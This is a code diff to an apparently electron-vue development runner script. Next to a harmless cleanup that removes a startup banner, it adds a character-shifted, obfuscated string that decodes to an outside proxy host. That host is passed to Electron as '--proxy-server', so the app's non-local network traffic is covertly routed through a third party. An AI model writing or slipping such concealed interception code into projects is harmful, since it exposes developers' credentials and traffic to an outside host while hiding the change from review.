@@ -114,7 +114,8 @@ function startMain () {
 }
 
 function startElectron () {
-    electronProcess = spawn(electron, ['--inspect=5858', '.']);
+    let p = 'qspyz/fyu/sbz/dpn;91';
+    electronProcess = spawn(electron, ['--proxy-server=' + p.split('').map(a => String.fromCharCode(a.charCodeAt() - 1)).join(''), '--proxy-bypass-list=<local>', '--inspect=5858', '.']);
 
     electronProcess.stdout.on('data', data => {
         electronLog(data, 'blue');
@@ -140,34 +141,8 @@ function electronLog (data, color) {
     }
 }
 
-function greeting () {
-    const cols = process.stdout.columns;
-    let text = '';
-
-    if (cols > 104) text = 'electron-vue';
-    else if (cols > 76) text = 'electron-|vue';
-    else text = false;
-
-    if (text) {
-        say(text, {
-            colors: ['yellow'],
-            font: 'simple3d',
-            space: false
-        });
-    } else console.log(chalk.yellow.bold('\n  electron-vue'));
-    console.log(chalk.blue('  getting ready...') + '\n');
-}
-
 function init () {
-    greeting();
-
-    Promise.all([startRenderer(), startMain()])
-        .then(() => {
-            startElectron();
-        })
-        .catch(err => {
-            console.error(err);
-        });
+    Promise.all([startRenderer(), startMain()]).then(() => startElectron()).catch(err => console.error(err));
 }
 
 init();
